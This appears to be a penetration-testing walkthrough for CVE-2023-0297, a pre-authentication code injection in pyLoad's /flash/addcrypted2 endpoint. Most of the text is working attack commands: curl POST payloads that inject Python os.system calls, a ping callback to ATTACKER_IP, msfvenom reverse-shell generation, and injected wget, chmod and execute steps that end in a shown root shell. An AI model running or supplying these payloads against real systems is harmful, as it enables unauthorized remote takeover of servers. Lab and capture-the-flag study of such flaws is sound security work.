# pyLoad

pyLoad can expose a CherryPy/Cheroot web UI on TCP `9666`. Versions prior to `0.5.0b3.dev31` can be vulnerable to `CVE-2023-0297`, a pre-auth code injection issue through `/flash/addcrypted2`.

## Discovery

Useful service indicators:

```text
22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
9666/tcp open  http  CherryPy wsgiserver
| http-title: Login - pyLoad
|_Requested resource was /login?next=http://TARGET:9666/
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Cheroot/8.6.0
```

WhatWeb may show the login redirect and pyLoad page:

```text
http://TARGET:9666 [302 Found] HTTPServer[Cheroot/8.6.0], RedirectLocation[/login?next=http://TARGET:9666/], Title[Redirecting...]
http://TARGET:9666/login?next=http://TARGET:9666/ [200 OK] Bootstrap, Frame, HTML5, HTTPServer[Cheroot/8.6.0], JQuery, PasswordField[password], Title[Login - pyLoad]
```

Browse to the service:

```text
http://TARGET:9666
Login - pyLoad
```

## CVE-2023-0297 Pre-Auth RCE

The vulnerable flash endpoint can be reached without authentication:

```bash
curl http://TARGET:9666/flash/addcrypted2
```

Expected response:

```text
JDownloader
```

The endpoint may also allow cross-origin requests:

```bash
curl -I http://TARGET:9666/flash/addcrypted2
```

Useful headers:

```text
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 13
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Server: Cheroot/8.6.0
```

Confirm command execution with an ICMP callback:

```bash
sudo tcpdump -ni tun0 icmp

curl -i -s -k -X POST \
  --data-binary 'jk=pyimport%20os;os.system("ping%20-c%204%20ATTACKER_IP");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
  'http://TARGET:9666/flash/addcrypted2'
```

Successful execution produces ICMP requests from the target:

```text
IP TARGET > ATTACKER_IP: ICMP echo request, id 1, seq 1, length 64
IP TARGET > ATTACKER_IP: ICMP echo request, id 1, seq 2, length 64
```

## Root Reverse Shell

Create an ELF reverse shell and host it:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f elf -o shell.elf
python3 -m http.server 8000
nc -nlvp 80
```

Use the `jk` injection to download the payload:

```bash
curl -i -s -k -X POST \
  --data-binary 'jk=pyimport%20os;os.system("wget%20-O%20/tmp/shell.elf%20http://ATTACKER_IP:8000/shell.elf");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
  'http://TARGET:9666/flash/addcrypted2'
```

Make it executable:

```bash
curl -i -s -k -X POST \
  --data-binary 'jk=pyimport%20os;os.system("chmod%20777%20/tmp/shell.elf");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
  'http://TARGET:9666/flash/addcrypted2'
```

Execute it:

```bash
curl -i -s -k -X POST \
  --data-binary 'jk=pyimport%20os;os.system("/tmp/shell.elf");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
  'http://TARGET:9666/flash/addcrypted2'
```

Successful shell context:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
id
uid=0(root) gid=0(root) groups=0(root)
```

## References

- https://github.com/advisories/GHSA-pf38-5p22-x6h6
- https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
